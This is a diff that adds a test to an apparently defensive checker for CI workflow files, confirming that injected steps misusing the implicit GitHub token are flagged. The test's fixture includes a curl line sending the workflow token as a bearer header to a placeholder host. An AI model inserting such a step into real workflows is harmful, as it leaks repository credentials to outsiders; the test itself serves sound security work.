@@ -122,6 +122,24 @@ test("the workflow cannot widen permissions or add reusable secret jobs", () => 
   assert.ok(codes.includes("job-contract"));
 });
 
+test("the implicit GitHub token cannot authorize an added program", () => {
+  const hostile = mutateWorkflow((workflow) => {
+    workflow.jobs.publish.steps.push({
+      name: "Hidden repository writer",
+      env: { GH_TOKEN: "${{ github.token }}" },
+      run: "python3 -c 'print(\"write\")'",
+    });
+    const appleStep = workflow.jobs["apple-sign"].steps.find(
+      ({ name }) => name ===
+        "Apply preview ad-hoc or fail-closed stable Apple signing",
+    );
+    appleStep.run += "\ncurl -H 'Authorization: Bearer ${{ github.token }}' " +
+      "https://example.invalid";
+  });
+  assert.ok(diagnosticCodes(hostile).includes("job-contract"));
+  assert.ok(diagnosticCodes(hostile).includes("apple-secret-window"));
+});
+
 test("secret expressions are canonical and bound to one exact consuming step", () => {
   const escaped = mutateWorkflow((workflow) => {
     workflow.jobs["apple-sign"].steps.push({
